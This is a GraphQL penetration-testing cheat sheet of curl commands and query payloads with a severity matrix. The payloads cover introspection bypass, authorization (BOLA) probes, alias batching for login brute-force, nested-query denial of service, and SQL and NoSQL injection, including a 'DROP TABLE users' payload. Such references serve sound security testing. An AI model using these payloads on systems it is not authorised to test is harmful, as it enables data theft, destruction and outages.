# GraphQL Testing Reference

## Introspection

### Full Schema Dump
```bash
# Query type (read operations)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name } } } } } } }"}'

# Mutation type (write operations)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name } } } } } } }"}'

# Subscription type
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { subscriptionType { fields { name } } } }"}'

# All types with fields
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}'
```

### Introspection Disabled — Bypass Attempts
```bash
# Field suggestion exploitation (typo-based)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ usrs { id } }"}'
# Error: "Did you mean 'users'?" → reveals field names

# __type query (sometimes allowed when __schema is blocked)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}'

# GET request (some WAFs only block POST introspection)
curl -s "$URL/graphql?query=%7B__schema%7BqueryType%7Bfields%7Bname%7D%7D%7D%7D"
```

## Authentication & Authorization

### Unauthenticated Access
```bash
# Test every query/mutation without auth header
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role } }"}'

# Test mutations without auth
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id:\"1\", input:{role:\"admin\"}) { id role } }"}'
```

### Object-Level Authorization (BOLA)
```bash
# Query other users' data with your token
curl -s "$URL/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ user(id:\"OTHER_USER_ID\") { email phone ssn } }"}'

# Nested object access (user → orders → other user's orders)
curl -s "$URL/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ order(id:\"OTHER_ORDER_ID\") { items total shippingAddress { street city } } }"}'
```

## Batching & Amplification

### Alias Batching
```bash
# Execute multiple operations in one request
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { a:login(email:\"user@test.com\",password:\"pass1\") { token } b:login(email:\"user@test.com\",password:\"pass2\") { token } c:login(email:\"user@test.com\",password:\"pass3\") { token } }"}'
# If all execute → rate limiting bypass for brute-force
```

### Array Batching
```bash
# Multiple queries in array format
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:\"1\") { email } }"},{"query":"{ user(id:\"2\") { email } }"},{"query":"{ user(id:\"3\") { email } }"}]'
# Often disabled ("Batching is not enabled") but alias batching still works
```

### Mutation Amplification
```bash
# Create 100 resources in one request
QUERY="mutation {"
for i in $(seq 1 100); do
  QUERY="$QUERY a$i:createItem(input:{name:\"item$i\"}) { id }"
done
QUERY="$QUERY }"
curl -s "$URL/graphql" -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}"
```

## Denial of Service

### Depth Attack
```bash
# Deeply nested query (no depth limit = DoS)
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { author { posts { author { posts { author { name } } } } } } } }"}'
# If returns data at depth 7+ → no depth limiting
```

### Width Attack
```bash
# Request all fields on all types
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id name email phone address { street city state zip country } orders { id items { name price quantity } } } }"}'
```

### Circular Fragment
```graphql
fragment A on User { posts { ...B } }
fragment B on Post { author { ...A } }
query { users { ...A } }
```

## Injection

### SQL Injection via Arguments
```bash
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter:{name:\"admin\\\" OR 1=1--\"}) { id email } }"}'
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users(orderBy:\"name; DROP TABLE users--\") { id } }"}'
```

### NoSQL Injection
```bash
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:{\"$gt\":\"\"}) { id email } }"}'
```

## Subscriptions (WebSocket)

```bash
# Connect to subscription endpoint
wscat -c "wss://$HOST/graphql" -x '{"type":"connection_init","payload":{}}'
# Subscribe to events (may bypass auth)
# Send: {"type":"start","id":"1","payload":{"query":"subscription { newMessage { content sender } }"}}
```

## Information Disclosure

### Error-Based Enumeration
```bash
# Invalid field → reveals valid fields in error
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"1\") { nonexistent } }"}'
# "Cannot query field 'nonexistent' on type 'User'. Did you mean 'name', 'email'?"

# Type confusion → reveals type structure
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"INVALID\") { name } }"}'
```

### Debug Mode
```bash
# Some implementations expose debug info
curl -s "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { directives { name locations args { name } } } }"}'
# Look for: @deprecated, @auth, @hasRole, @rateLimit directives
```

## Severity Matrix

| Finding | Severity | Condition |
|---------|----------|-----------|
| Introspection enabled (prod) | Low-Medium | Depends on what's exposed |
| Unauthenticated mutations | High-Critical | Write operations without auth |
| BOLA via nested queries | High | Access other users' data |
| No depth/complexity limit | Medium | DoS potential |
| Alias batching + no rate limit | Medium-High | Brute-force amplification |
| SQL injection in arguments | Critical | Data breach |
| Subscription auth bypass | Medium-High | Real-time data leak |
